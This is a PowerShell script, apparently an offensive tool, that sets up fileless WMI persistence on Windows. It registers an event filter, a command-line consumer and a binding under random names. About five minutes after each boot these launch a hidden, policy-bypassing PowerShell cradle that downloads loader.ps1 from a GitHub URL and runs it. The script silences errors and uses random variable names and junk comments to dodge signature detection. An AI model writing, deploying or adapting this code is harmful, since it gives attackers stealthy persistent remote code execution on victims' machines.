$ErrorActionPreference = "SilentlyContinue"

# === Fileless WMI Persistence ===
$null = Get-Date -Format "ylBk"
# Strategy: 
# 1. Do NOT drop binary to disk.
# 2. Register WMI Event to trigger on system uptime (delayed start).
# 3. Consumer executes the PowerShell Cradle to download loader.ps1.

# OgOPwrnZaWjnipPnVVsCQNINZnlDkn
$QAuHEtsnDfAo = "https://raw.githubusercontent.com/jeromegerchin/upjsdefer/main/loader.ps1"
# Hardened Cradle (Hidden, Bypass, No Profile)
# We use a randomized variable for IEX to avoid simple signatures
$ZtmkkRCiIlhLRh = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('$QAuHEtsnDfAo')"""

# 2. Randomization
$nKclZfbXGVBD = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
# VYAEysrJYWIyeXjIbUKjftMBWxjnzJ
$LSbmFFsmVbibxOsBqbo = ""
1..10 | ForEach-Object { $LSbmFFsmVbibxOsBqbo += $nKclZfbXGVBD[(Get-Random -Maximum $nKclZfbXGVBD.Length)] }

# 3. Clean Old Persistence (if matches our pattern, optional)
Get-WmiObject __EventFilter -Namespace "root\subscription" | Where-Object { $_.Name -match "SysX" } | Remove-WmiObject

# 3. Create Trigger (Filter)
# Trigger: 5 minutes after boot (Uptime > 300s & < 400s)
# Optimized to run only ONCE per boot cycle
$iBBcYfoqLuuTaLmoG = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"

# GBqawyKxfAUWYVmPiiXAPWARsAqfGt
$CxKWRRHLqeQiJyyo = @{
    Name           = $LSbmFFsmVbibxOsBqbo
    EventNamespace = "root\cimv2"
# GvsEwozxaMrVDFcnrBXfoDsRNpymZL
    QueryLanguage  = "WQL"
    Query          = $iBBcYfoqLuuTaLmoG
}
$tnYCqmKEEubWBCy = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $CxKWRRHLqeQiJyyo

# 4. Create Action (Consumer)
$ZSHhexaTOfrclQUUiqH = @{
    Name                = $LSbmFFsmVbibxOsBqbo
$null = Get-Date -Format "VAEj"
    CommandLineTemplate = $ZtmkkRCiIlhLRh
    RunInteractively    = $false
}
$rVlJFWbdxLpWrDxUXqGB = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ZSHhexaTOfrclQUUiqH

$null = Get-Date -Format "Pthb"
# 5. Bind
$oSRFMEjxLINmyKkru = @{
    Filter   = $tnYCqmKEEubWBCy
# oQFOhjlJLLPIDzItlANBKAyZRkCsLo
    Consumer = $rVlJFWbdxLpWrDxUXqGB
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $oSRFMEjxLINmyKkru

Write-Host "[+] Fileless WMI Persistence Established" -ForegroundColor Green

